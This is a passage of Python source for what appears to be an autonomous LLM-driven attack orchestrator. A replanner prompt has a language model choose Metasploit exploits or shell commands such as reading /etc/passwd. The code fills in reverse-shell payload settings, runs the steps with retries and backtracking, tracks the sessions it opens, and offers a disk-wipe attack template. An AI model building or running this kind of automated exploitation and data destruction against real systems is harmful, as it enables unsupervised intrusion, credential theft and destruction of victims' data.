You are STUCK at a specific node. The pre-planned path is blocked. Your job:
propose the SMALLEST POSSIBLE INTENT for the next step.

DO NOT emit full module options, payload params, or command parameter dicts.
The system will fill in RHOSTS/LHOST/LPORT/RPORT defaults from graph context.
Just tell us WHAT to try next.

You will receive: objective, target IP, attacker IP, detected services,
recent command output, failed edges, and remaining unreached nodes.

RESPOND WITH EXACTLY ONE of these JSON shapes:

1) Use an MSF module (system fills RHOSTS/LHOST/LPORT/RPORT defaults):
   {"action": "use_module",
    "target_hint": "exploit/unix/ftp/proftpd_modcopy_exec",
    "label": "ProFTPD modcopy RCE",
    "goal": "Get shell via FTP",
    "rationale": "ProFTPD 1.3.5 on port 21 -- known mod_copy RCE"}

2) Run shell/session commands (newline-separated if multiple):
   {"action": "run_commands",
    "target_hint": "id\\ncat /etc/passwd",
    "label": "Read passwd",
    "goal": "Confirm root + dump users",
    "rationale": "Session is open; verify access before pivoting"}

3) Connect to an existing unreached node:
   {"action": "new_edge",
    "target_hint": "<existing_node_id>",
    "rationale": "current findings satisfy that node's preconditions"}

4) Give up:
   {"action": "give_up",
    "rationale": "..."}

Rules:
- For use_module: target_hint is JUST the module path. Don't include options.
- For run_commands: target_hint is the literal command(s). The system picks
  session vs. SSH based on whether an active session exists.
- For new_edge: target_hint must be a PENDING/BLOCKED node id (NOT FAILED).
- *** NEVER propose a module path or command that already appears in the
    FAILED entries of REMAINING NODES. *** Read those entries' `module` and
    `commands_to_run` fields carefully -- if it's there, it already failed.
- DIVERSIFY across replans: if FTP didn't work, try Samba / IRC / HTTP / etc.
  Each replan should try a SUBSTANTIALLY different vector.
- Match exploits to the DETECTED SERVICES versions you see in the context.
  Note: version mismatches are warnings, not rejections -- they can still run.
- ONE proposal per call. Concrete. No placeholders like "..." or "<ip>".
"""


# Common-service → default port table. Used by _guess_rport_from_module
# to fill RPORT when the LLM doesn't include it.
_MODULE_DEFAULT_PORTS: list[tuple[str, int]] = [
    ("proftpd", 21), ("vsftpd", 21), ("/ftp/", 21),
    ("/ssh/", 22),
    ("/smtp/", 25),
    ("/dns/", 53),
    ("/http/", 80), ("rails", 80), ("drupal", 80), ("wordpress", 80),
    ("/pop3/", 110),
    ("/imap/", 143),
    ("/https/", 443),
    ("samba", 445), ("smb", 445), ("netbios", 445),
    ("mysql", 3306),
    ("postgres", 5432),
    ("/vnc/", 5900),
    ("unreal_ircd", 6667), ("/irc/", 6667),
    ("/rmi/", 1099),
]


def _guess_rport_from_module(module: str) -> Optional[int]:
    """Heuristic: infer the typical target port from common MSF module name patterns."""
    m = module.lower()
    for needle, port in _MODULE_DEFAULT_PORTS:
        if needle in m:
            return port
    return None


def _expand_intent_to_node(
    intent: dict, graph: AttackGraph, stuck_node: AttackNode,
) -> Optional[AttackNode]:
    """
    Expand a tiny LLM intent into a full AttackNode.

    The LLM emits {action, target_hint, label?, goal?, rationale}.
    This helper fills in agent_type, tool_name, target_ip, module_options
    (RHOSTS, RPORT) and payload_options (LHOST, LPORT) from graph context.

    Returns None for malformed or unsupported intents.
    """
    action = intent.get("action", "")
    target_hint = (intent.get("target_hint") or "").strip()
    if not target_hint:
        return None

    # Build a sanitized, unique node id from the target_hint
    raw = target_hint.rsplit("/", 1)[-1].split("\n", 1)[0].split()[0][:40]
    raw = "".join(c if c.isalnum() else "_" for c in raw).strip("_") or "replan_node"
    nid = raw
    suffix = 1
    while nid in graph.nodes:
        suffix += 1
        nid = f"{raw}_{suffix}"

    has_session = any(
        n.findings.get("session_id")
        for n in graph.nodes.values()
        if n.status == NodeStatus.SUCCESS.value
    )

    label = (intent.get("label") or f"Replan: {target_hint[:60]}").strip()
    goal = (intent.get("goal") or "Continue toward objective via replanner").strip()

    if action == "use_module":
        module_options = {"RHOSTS": graph.target_ip}
        rport = _guess_rport_from_module(target_hint)
        if rport:
            module_options["RPORT"] = rport
        payload_options = {"LHOST": graph.attacker_ip, "LPORT": 4444}
        return AttackNode(
            id=nid,
            label=label,
            goal=goal,
            agent_type="exploit",
            objective=f"Run {target_hint} against {graph.target_ip}",
            target_ip=graph.target_ip,
            tool_name="metasploit",
            module=target_hint,
            module_options=module_options,
            payload_options=payload_options,
            max_retries=3,
            tags=["replanner_generated", "intent_expanded"],
        )

    if action == "run_commands":
        commands = [c.strip() for c in target_hint.split("\n") if c.strip()]
        if not commands:
            return None
        tool_name = "session" if has_session else "ssh"
        agent_type = "impact" if has_session else "discovery"
        return AttackNode(
            id=nid,
            label=label,
            goal=goal,
            agent_type=agent_type,
            objective=f"Run shell commands toward: {goal}",
            target_ip=graph.target_ip,
            tool_name=tool_name,
            commands_to_run=commands,
            max_retries=2,
            tags=["replanner_generated", "intent_expanded"],
        )

    return None  # Unsupported action


def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) -> Optional[str]:
    """
    Attempt to grow a new edge from a stuck node.

    Called when the walker reaches a node whose outgoing edges all fail their checks.
    Asks the LLM to propose the next step from this specific node.

    Returns the target node ID to continue to, or None if replanning failed.
    """
    stuck_node = graph.nodes[stuck_node_id]
    log.info(f"[Replanner] Stuck at '{stuck_node_id}' — asking LLM for next step...")

    # Build context — keep everything, but cap raw_nmap_output at 8 KB
    # so a 200 KB scan dump doesn't blow the context window.
    full_findings = dict(stuck_node.findings)
    if "raw_nmap_output" in full_findings:
        full_findings["raw_nmap_output"] = _cap_text(
            full_findings["raw_nmap_output"], 8192,
        )

    # Failed outgoing edges — include target node's goal
    failed_edges = []
    for edge in graph.outgoing_edges(stuck_node_id):
        failed_checks = []
        for check in edge.checks:
            if not check.evaluate(stuck_node.findings):
                failed_checks.append(str(check))
        if failed_checks or not graph._edge_satisfied(edge):
            target_node = graph.nodes[edge.target]
            failed_edges.append({
                "target": edge.target,
                "target_label": target_node.label,
                "target_goal": target_node.goal,
                "target_objective": target_node.objective[:200],
                "failed_checks": failed_checks,
                "rationale": edge.rationale,
            })

    # Remaining unreached nodes — include goals and failure info.
    # For FAILED nodes, also include the module/command summary so the LLM
    # can see what was actually tried (and avoid proposing the same thing).
    remaining = {}
    for nid, node in graph.nodes.items():
        if node.status in (NodeStatus.PENDING.value, NodeStatus.BLOCKED.value):
            remaining[nid] = {
                "label": node.label,
                "goal": node.goal,
                "agent_type": node.agent_type,
                "objective": node.objective[:200],
                "tool_name": node.tool_name,
            }
        elif node.status == NodeStatus.FAILED.value:
            remaining[nid] = {
                "label": node.label,
                "goal": node.goal,
                "status": "FAILED — DO NOT propose this same approach again",
                "module": node.module,                          # what was tried
                "commands_to_run": node.commands_to_run[:3],    # first 3 cmds
                "failure_reason": node.metadata.get("last_failure_reason", "unknown"),
            }

    # Always surface recon findings (services + versions) explicitly,
    # even if the stuck node isn't the recon node — the replanner needs
    # version info to pick compatible exploits.
    recon_findings = _gather_recon_findings(graph)
    detected_services = []
    if recon_findings.get("ports"):
        for p in recon_findings["ports"]:
            detected_services.append({
                "port": p.get("port"),
                "service": p.get("service", ""),
                "version": p.get("version", ""),
            })

    # Recent raw command output — what an operator would actually read
    # (banners, stderr, exit codes) — not just typed findings.
    recent_cmds = _recent_command_excerpts(stuck_node, n=3, cap=2048)

    context = (
        f"OBJECTIVE: {graph.objective}\n\n"
        f"TARGET (RHOSTS): {graph.target_ip}\n"
        f"ATTACKER (LHOST): {graph.attacker_ip}\n\n"
        f"DETECTED SERVICES (from recon — match exploit versions to these!):\n"
        f"{json.dumps(detected_services, indent=2)}\n\n"
        f"STUCK AT NODE: {stuck_node_id} ({stuck_node.label})\n"
        f"STUCK NODE FINDINGS: {json.dumps(full_findings, indent=2, default=str)}\n\n"
        f"RECENT COMMAND OUTPUT (last 3, tails capped at 2KB):\n"
        f"{json.dumps(recent_cmds, indent=2, default=str)}\n\n"
        f"FAILED OUTGOING EDGES:\n{json.dumps(failed_edges, indent=2, default=str)}\n\n"
        f"REMAINING NODES:\n{json.dumps(remaining, indent=2, default=str)}\n"
    )

    log.debug(f"[Replanner] Context (full, {len(context)} chars):\n{context}")

    try:
        response = call_llm(
            messages=[HumanMessage(content=context)],
            system_prompt=REPLAN_PROMPT,
            model_name=REPLAN_MODEL_NAME,
        )
        result = parse_json_response(response.content)
    except Exception as e:
        log.error(f"[Replanner] LLM call failed: {e}")
        return None

    if not result:
        log.warning("[Replanner] LLM returned empty/unparseable response.")
        return None

    action = result.get("action", "")
    rationale = result.get("rationale", "")

    if action == "new_edge":
        target_id = result.get("target", "")
        if target_id not in graph.nodes:
            log.warning(f"[Replanner] Target node '{target_id}' not found")
            return None

        # Don't re-route to a node that exhausted its retries
        target_node = graph.nodes[target_id]
        if target_node.status == NodeStatus.FAILED.value:
            log.warning(f"[Replanner] Target '{target_id}' is FAILED (exhausted retries) — refusing to retry it")
            return None

        graph.connect(
            stuck_node_id, target_id,
            evidence=f"Replanner: rerouted from {stuck_node_id}",
            rationale=rationale,
            condition="on_success",
        )
        log.info(f"[Replanner] NEW EDGE: {stuck_node_id} → {target_id} — {rationale}")
        return target_id

    elif action in ("use_module", "run_commands"):
        # New tiny-intent path: LLM emits {action, target_hint, label?, goal?}.
        # We expand to a full AttackNode here using graph context defaults.
        new_node = _expand_intent_to_node(result, graph, stuck_node)
        if not new_node:
            log.warning(
                f"[Replanner] Could not expand intent (action={action}, "
                f"target_hint={result.get('target_hint', '')!r})"
            )
            return None

        # Anti-repetition guard: reject if THIS EXACT module (or command set)
        # already failed in a prior node. This is rejection-by-observed-failure,
        # not speculative — Stage 1's loosening was about heuristic version
        # rejection, this is "you literally tried this and it didn't work".
        if new_node.module:
            failed_with_same_module = [
                n.id for n in graph.nodes.values()
                if n.status == NodeStatus.FAILED.value and n.module == new_node.module
            ]
            if failed_with_same_module:
                log.warning(
                    f"[Replanner] REJECTED {new_node.module}: already tried "
                    f"and failed in {failed_with_same_module}"
                )
                return None
        elif new_node.commands_to_run:
            new_cmds_key = tuple(new_node.commands_to_run)
            failed_with_same_cmds = [
                n.id for n in graph.nodes.values()
                if n.status == NodeStatus.FAILED.value
                and tuple(n.commands_to_run) == new_cmds_key
            ]
            if failed_with_same_cmds:
                log.warning(
                    f"[Replanner] REJECTED identical command set: already tried "
                    f"and failed in {failed_with_same_cmds}"
                )
                return None

        # ADVISORY VALIDATION (Stage 1): warn if the module doesn't match recon,
        # but don't reject. Failure is signal — let it run and fail naturally.
        if new_node.module:
            recon_findings = _gather_recon_findings(graph)
            ok, reason = _validate_msf_module_for_target(
                new_node.module, recon_findings, log,
            )
            if not ok:
                log.warning(
                    f"[Replanner] ADVISORY mismatch for {new_node.module}: "
                    f"{reason} -- allowing anyway"
                )
            else:
                log.info(f"[Replanner] Module validation OK: {reason}")

        graph.add_node(new_node)
        graph.connect(
            stuck_node_id, new_node.id,
            evidence=f"Replanner: new step from {stuck_node_id}",
            rationale=rationale,
            condition="on_success",
        )
        log.info(f"[Replanner] NEW NODE: {new_node.id} ({new_node.label})")
        log.info(
            f"[Replanner] NEW EDGE: {stuck_node_id} → {new_node.id} -- {rationale}"
        )
        return new_node.id

    elif action == "give_up":
        log.warning(f"[Replanner] Gave up: {result.get('reason', '?')}")
        return None

    else:
        log.warning(f"[Replanner] Unknown action: {action}")
        return None


# =============================================================================
# GRAPH WALKER — backtracking depth-first traversal
# =============================================================================

def _find_next(graph: AttackGraph, node_id: str, tried: set, log: logging.Logger) -> Optional[str]:
    """
    Find the next node to visit from node_id by evaluating outgoing edges.

    Checks each outgoing edge's gate + checks against the node's findings.
    Skips edges already in the 'tried' set.

    Returns the first target node ID whose edge is satisfied, or None.
    """
    for edge in graph.outgoing_edges(node_id):
        edge_key = f"{edge.source}→{edge.target}"
        if edge_key in tried:
            continue

        if graph._edge_satisfied(edge):
            # Log which checks passed
            for check in edge.checks:
                passed = check.evaluate(graph.nodes[node_id].findings)
                log.info(f"    {'PASS' if passed else 'FAIL'}: {check}")
            log.info(f"  [{node_id}] → {edge.target} (edge satisfied)")
            return edge.target
        else:
            # Log which checks failed
            for check in edge.checks:
                passed = check.evaluate(graph.nodes[node_id].findings)
                if not passed:
                    log.info(f"    FAIL: {check}")
            tried.add(edge_key)
            log.info(f"  [{node_id}] → {edge.target} (edge FAILED — skipping)")

    return None


def _execute_node(
    node_id: str, graph: AttackGraph, log: logging.Logger,
    explore: bool, checkpoint_path: str, use_judge: bool = True,
) -> tuple[bool, str]:
    """
    Execute a single node. Returns (success, reason).

    reason is one of:
      "success"           — node succeeded
      "retries_exhausted" — node failed after burning all max_retries
      "judge_escalate"    — judge cut retries short; replanner should run
    """
    node = graph.get_node(node_id)

    while True:
        node.mark_running()
        log.info(f"  [{node_id}] STATUS → running")

        try:
            t_start = time.time()
            log.info(f"  [{node_id}] Subagent started...")
            findings = dispatch_node(node, graph, log, explore=explore)
            elapsed = time.time() - t_start
            log.info(f"  [{node_id}] Subagent finished in {elapsed:.0f}s")

            success = findings.get("success", False)
            summary = findings.get("summary", "")
            log.debug(f"  [{node_id}] findings: {json.dumps(findings, default=str)[:2000]}")

            if success:
                node.mark_success(findings, summary)
                log.info(f"  [{node_id}] STATUS → success: {summary}")

                # Track sessions globally
                if "session_id" in findings and findings.get("session_id"):
                    session_info = {
                        "session_id": str(findings["session_id"]),
                        "type": findings.get("session_type", "unknown"),
                        "target": node.target_ip or graph.target_ip,
                        "source_node": node_id,
                    }
                    graph.active_sessions.append(session_info)
                    log.info(f"  [{node_id}] New session tracked: {session_info}")

                _checkpoint(graph, checkpoint_path, log)
                return True, "success"

            else:
                reason = summary or "No success flag in findings"
                node.mark_failed(reason)
                if not node.can_retry:
                    log.error(f"  [{node_id}] STATUS → failed: {reason}")
                    return False, "retries_exhausted"

                # Layer 2: consult the judge before burning the next retry.
                # If it says escalate, return early so the walker can replan.
                if use_judge:
                    decision = judge("post_retry", node, graph, log)
                    if decision["action"] == "escalate":
                        log.info(
                            f"  [{node_id}] Judge cut retries short -- "
                            f"escalating to replanner"
                        )
                        return False, "judge_escalate"
                    # 'adapt' and 'continue' both retry; 'adapt' is honoured
                    # by the existing alts[] cycling via node.retries.

                log.warning(
                    f"  [{node_id}] STATUS → retry "
                    f"({node.retries}/{node.max_retries}): {reason}"
                )
                time.sleep(2)
                continue  # Retry

        except Exception as e:
            node.mark_failed(str(e))
            log.exception(f"  [{node_id}] STATUS → error: {e}")
            if node.can_retry:
                time.sleep(2)
                continue
            return False, "retries_exhausted"


def run_graph(
    graph: AttackGraph,
    checkpoint_path: Optional[str] = None,
    explore: bool = False,
    use_judge: bool = True,
) -> AttackGraph:
    """
    Walk an AttackGraph using backtracking depth-first traversal.

    Flow:
      1. Start at a root node
      2. Execute it
      3. On success: optional judge call (post_node) — if it says escalate, go to
         replanner. Otherwise evaluate outgoing edges, follow first that passes.
      4. On stuck (no edges pass):
         - If explore=True: replanner grows a new edge from here
         - If explore=False: backtrack to predecessor, try next edge
      5. On node failure: retry if possible (judge can cut retries short via
         post_retry), else backtrack
      6. Repeat until objective reached or no more options
    """
    log = _setup_logger(graph.name)

    if not checkpoint_path:
        checkpoint_path = f"graphs/{graph.name}_state.json"

    graph.status = "running"
    graph.started_at = graph.started_at or _now()

    log.info(f"{'='*70}")
    log.info(f"[Orchestrator] Starting graph execution (backtracking walker)")
    log.info(f"  Graph: {graph.name} ({graph.id})")
    log.info(f"  Objective: {graph.objective}")
    log.info(f"  Target: {graph.target_ip}  Attacker: {graph.attacker_ip}")
    log.info(f"  Nodes: {len(graph.nodes)}  Edges: {len(graph.edges)}")
    log.info(f"  Explore: {explore}  Judge: {use_judge}")
    log.info(f"  Models: replanner={REPLAN_MODEL_NAME}  judge={JUDGE_MODEL_NAME}")
    log.info(f"  Checkpoint: {checkpoint_path}")
    log.info(f"{'='*70}")

    # Track which edges we've tried (to avoid re-checking failed ones)
    tried_edges: set[str] = set()
    # Path stack for backtracking
    path: list[str] = []
    # Replan budget — raised from 5 to 10 since the judge triggers replans
    # earlier; per-call cost is unchanged, just more attempts allowed.
    replan_attempts = 0
    max_replan_attempts = 10

    # Find first root node
    roots = graph.root_nodes()
    if not roots:
        log.error("[Orchestrator] No root nodes found in graph!")
        return graph
    current = roots[0]
    log.info(f"[Orchestrator] Starting at root node: {current}")

    needs_replan = False  # Flag: when True, skip _find_next and go straight to replanner

    while current:
        node = graph.get_node(current)

        # Skip if already completed (e.g., on backtrack path)
        if node.status == NodeStatus.SUCCESS.value:
            # If we backtracked here, go straight to replanner
            if needs_replan:
                needs_replan = False
                new_target, replan_attempts = _try_replanner(
                    graph, current, log, checkpoint_path,
                    replan_attempts, max_replan_attempts, explore,
                )
                if new_target:
                    path.append(current)
                    current = new_target
                    continue
                # Replanner failed or not in explore mode — backtrack further
                if path:
                    current = path.pop()
                    needs_replan = True
                    log.info(f"[Orchestrator] Replanner exhausted, backtracking to: {current}")
                    continue
                else:
                    log.info("[Orchestrator] Path exhausted — no more options.")
                    break

            # Normal flow — try existing edges first
            log.info(f"\n[{current}] Already succeeded — finding next edge...")
            next_node = _find_next(graph, current, tried_edges, log)
            if next_node:
                path.append(current)
                current = next_node
                continue

            # All existing edges exhausted — try replanner
            new_target, replan_attempts = _try_replanner(
                graph, current, log, checkpoint_path,
                replan_attempts, max_replan_attempts, explore,
            )
            if new_target:
                path.append(current)
                current = new_target
                continue

            # Backtrack
            if path:
                current = path.pop()
                log.info(f"[Orchestrator] Backtracking to: {current}")
                continue
            else:
                log.info("[Orchestrator] Path exhausted — no more options.")
                break

        # Execute the node
        log.info(f"\n[Orchestrator] Executing node: {current} ({node.label})")
        success, reason = _execute_node(
            current, graph, log, explore, checkpoint_path, use_judge=use_judge,
        )

        if success:
            # Post-node judge: even on success, judge can force escalation
            # (e.g. node nominally succeeded but didn't actually advance toward
            # the goal — false positive). If escalate, skip edge eval.
            if use_judge:
                decision = judge("post_node", node, graph, log)
                if decision["action"] == "escalate":
                    log.info(
                        f"  [{current}] Judge escalated post-node -- "
                        f"forcing replanner before edge evaluation"
                    )
                    new_target, replan_attempts = _try_replanner(
                        graph, current, log, checkpoint_path,
                        replan_attempts, max_replan_attempts, explore,
                    )
                    if new_target:
                        path.append(current)
                        current = new_target
                        continue
                    # Replanner declined; fall through to normal edge eval.

            # Find next node via outgoing edges
            log.info(f"  [{current}] Evaluating outgoing edges...")
            next_node = _find_next(graph, current, tried_edges, log)

            if next_node:
                path.append(current)
                current = next_node
                continue

            # No outgoing edges pass — are we at a leaf? That's success (end of chain)
            if not graph.outgoing_edges(current):
                log.info(f"  [{current}] Leaf node — chain complete!")
                break

            # Have outgoing edges but all failed checks — stuck, go to replanner
            log.warning(f"  [{current}] All outgoing edges failed checks — stuck!")

            new_target, replan_attempts = _try_replanner(
                graph, current, log, checkpoint_path,
                replan_attempts, max_replan_attempts, explore,
            )
            if new_target:
                path.append(current)
                current = new_target
                continue

            # Can't replan — backtrack with replan flag for predecessor
            if path:
                current = path.pop()
                needs_replan = True
                log.info(f"[Orchestrator] Backtracking to: {current} (replan=True)")
                continue
            else:
                log.warning("[Orchestrator] No backtrack options — ending.")
                break

        else:
            # Node failed — mark the edge that led here as tried, then backtrack
            # Set needs_replan so the backtrack target goes straight to replanner.
            # `reason` is "retries_exhausted" or "judge_escalate".
            log.warning(
                f"  [{current}] Node failed ({reason}) -- "
                f"backtracking with replan flag..."
            )
            if path:
                predecessor = path[-1]
                tried_edges.add(f"{predecessor}→{current}")
                log.info(f"  Marked edge {predecessor}→{current} as tried")
                current = path.pop()
                needs_replan = True
                log.info(f"[Orchestrator] Backtracking to: {current} (replan=True)")
                continue
            else:
                log.error("[Orchestrator] Node failed with no backtrack options — ending.")
                break

        time.sleep(1)

    # Mark any remaining pending nodes
    for node in graph.nodes.values():
        if node.status == NodeStatus.PENDING.value:
            node.mark_skipped("Not reached by walker")

    # Final status
    graph.status = "completed"
    graph.completed_at = _now()
    _checkpoint(graph, checkpoint_path, log)
    _print_summary(graph, log)

    return graph


def _mark_blocked_nodes(graph: AttackGraph, log: logging.Logger = None):
    """Mark any remaining PENDING nodes as BLOCKED."""
    log = log or logging.getLogger("orchestrator")
    for node in graph.nodes.values():
        if node.status == NodeStatus.PENDING.value:
            preds = graph.predecessors(node.id)
            failed_preds = [
                pid for pid in preds
                if graph.nodes[pid].status == NodeStatus.FAILED.value
            ]
            if failed_preds:
                reason = f"Predecessor(s) failed: {', '.join(failed_preds)}"
                node.mark_blocked(reason)
                log.warning(f"  [{node.id}] STATUS → blocked: {reason}")


def _checkpoint(graph: AttackGraph, path: str, log: logging.Logger = None):
    """Save graph state to disk."""
    log = log or logging.getLogger("orchestrator")
    try:
        graph.save(path)
        log.debug(f"  Checkpoint saved: {path}")
    except Exception as e:
        log.warning(f"  Checkpoint save failed: {e}")


def _print_summary(graph: AttackGraph, log: logging.Logger = None):
    """Print final execution summary."""
    log = log or logging.getLogger("orchestrator")
    log.info(f"\n{'='*70}")
    log.info("[Orchestrator] EXECUTION COMPLETE")
    log.info(f"  Status: {graph.status}")
    log.info(f"  Success rate: {graph.success_rate():.0%}")

    for node in graph.nodes.values():
        icon = {
            "success": "✓", "failed": "✗",
            "skipped": "⊘", "blocked": "⊗",
        }.get(node.status, "?")
        log.info(f"  {icon} {node.id}: {node.summary or node.status}")

    if graph.active_sessions:
        log.info("\n  Active sessions:")
        for s in graph.active_sessions:
            log.info(
                f"    Session {s['session_id']} ({s['type']}) → {s['target']} "
                f"(from {s['source_node']})"
            )

    log.info(f"{'='*70}\n")


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# =============================================================================
# CLI — run a graph from a JSON file
# =============================================================================

def main():
    if len(sys.argv) < 2:
        print_colored("Usage: python -m core_agents.orchestrator <graph.json>", Colors.FAIL)
        print_colored("       python -m core_agents.orchestrator --interactive", Colors.FAIL)
        return

    if sys.argv[1] == "--interactive":
        _interactive_mode()
        return

    graph_path = sys.argv[1]
    if not Path(graph_path).exists():
        print_colored(f"Graph file not found: {graph_path}", Colors.FAIL)
        return

    graph = AttackGraph.load(graph_path)
    print_colored(f"Loaded graph: {graph.name}", Colors.OKGREEN)
    print(graph.summary())
    print()

    confirm = input("Execute this graph? [y/N]: ").strip().lower()
    if confirm != "y":
        print_colored("Aborted.", Colors.WARNING)
        return

    run_graph(graph)


def _interactive_mode():
    """Build a simple graph interactively then run it."""
    from examples.disk_wipe_graph import build_disk_wipe_graph

    print_colored("--- Graph-Driven Orchestrator ---", Colors.OKGREEN)

    target_ip = input("[Target IP]: ").strip()
    if not target_ip:
        print_colored("No target IP provided. Exiting.", Colors.FAIL)
        return

    attacker_ip = input("[Attacker IP] (default: 192.168.34.6): ").strip()
    if not attacker_ip:
        attacker_ip = "192.168.34.6"

    # For now, use the disk wipe template
    graph = build_disk_wipe_graph(target_ip=target_ip, attacker_ip=attacker_ip)
    print()
    print(graph.summary())
    print()

    confirm = input("Execute this graph? [y/N]: ").strip().lower()
    if confirm != "y":
        print_colored("Aborted.", Colors.WARNING)
        return

    run_graph(graph)


if __name__ == "__main__":
    main()
